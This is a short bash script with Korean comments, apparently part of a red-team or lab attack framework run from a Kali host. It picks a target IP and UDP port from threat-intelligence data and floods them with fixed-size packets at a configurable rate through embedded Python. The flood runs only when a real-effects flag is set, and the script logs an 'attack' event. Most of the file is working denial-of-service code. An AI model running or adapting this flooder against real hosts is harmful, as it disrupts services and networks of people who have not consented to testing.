#!/usr/bin/env bash
# CTI 기반 최신 UDP 포트로 플러딩 (Kali 호스트에서 직접 송신)
set -euo pipefail
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
. "$BASE/00_env.sh"; . "$BASE/sh_core/lpc_bus.sh"; . "$BASE/cti/cti_store.sh"

: "${DUR:=8}"
: "${PKT_SIZE:=250}"
: "${RATE_PPS:=1000}"

flood_host(){
python3 - <<PY
import socket, time, os
host=os.environ.get('CURRENT_IP')
port=int(os.environ.get('CURRENT_PORT'))
dur=int(os.environ.get('DUR','8'))
pps=int(os.environ.get('RATE_PPS','1000'))
sz=int(os.environ.get('PKT_SIZE','250'))
sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload=b'X'*sz
t0=time.time(); iv=1.0/max(1,pps)
while time.time()-t0<dur:
    sock.sendto(payload,(host,port))
    time.sleep(iv)
PY
}

main(){
  cti_resolve >/dev/null
  bus_emit "attack" "type=follow_flood ip=$CURRENT_IP port=$CURRENT_PORT pps=$RATE_PPS size=$PKT_SIZE dur=${DUR}s"
  if [ "${ALLOW_REAL_EFFECTS:-0}" -eq 1 ]; then flood_host; fi
  effect_emit "jitter_ms=2"
}
main "$@"
